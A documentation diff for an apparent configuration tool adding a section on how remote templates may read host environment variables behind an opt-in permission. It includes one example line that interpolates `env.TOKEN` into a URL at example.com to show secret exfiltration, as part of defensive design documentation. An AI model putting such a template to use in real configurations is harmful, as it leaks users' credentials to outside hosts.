@@ -96,6 +96,26 @@ one capture and cache entry per remote variable across inclusions; see
 [cache evaluation](../state.md#when-declarations-are-evaluated).
 Use `-vv` to inspect [inclusion variable blocks](../commands/vars.md#vars-list).
 
+## Templates and the host environment
+
+A [template](../repoformat.md#templates) in a contributed record could send a
+host secret to a URL of the remote author's choosing, as in
+`source = "https://example.com/${env.TOKEN}"`. So it reads
+[`env`](../environment.md#host-environment) only if the leaf sets
+[`allow-env-templates`](../repoformat.md#git) on the remote:
+
+```toml
+[remotes.corporate]
+type = "git"
+url = "git@git.example.com:it/dotfiles.git"
+allow-env-templates = true
+```
+
+Without it, a lookup in `env` fails the record. Conditions and leaf templates
+need no permission. The permission applies only to a checkout of the repository
+the remote's `url` names; see
+[permissions follow the origin](../safety.md#permissions-follow-the-origin).
+
 ## What an included action may not write
 
 Included repository paths must refer to the declaring repository's own tree.
@@ -113,8 +133,9 @@ warning: not included: include-remote corp.shared; an included repository does n
 ## An included manifest's own `[remotes]`
 
 The map is read for schema shape, then ignored. Unknown types and fields still
-fail. Value validation is skipped: invalid URLs, digests, empty refs, and
-case-colliding remote keys do not fail a run that includes the manifest.
+fail. Value validation is skipped: invalid URLs, digests, templates,
+conditions, empty refs, and case-colliding remote keys do not fail a run that
+includes the manifest.
 Nothing materializes these remotes or allows an included action to source them.
 
 A nonempty map warns once per inclusion, naming all ignored records; an empty
